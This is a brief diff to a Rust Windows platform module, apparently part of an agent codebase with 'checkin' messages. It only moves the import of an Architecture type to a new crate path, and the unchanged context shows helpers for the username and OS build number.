@@ -4,7 +4,7 @@ use ffiwrappers::windows::{processthreadsapi::token::CurrentToken, sysinfoapi};
 mod platform;
 pub use platform::{build_number, product};
 
-use crate::proto::checkin::Architecture;
+use base_profile::msg::checkin::Architecture;
 
 pub fn username() -> Result<String, ThanatosError> {
     ffiwrappers::windows::username().map_err(ThanatosError::FFIError)
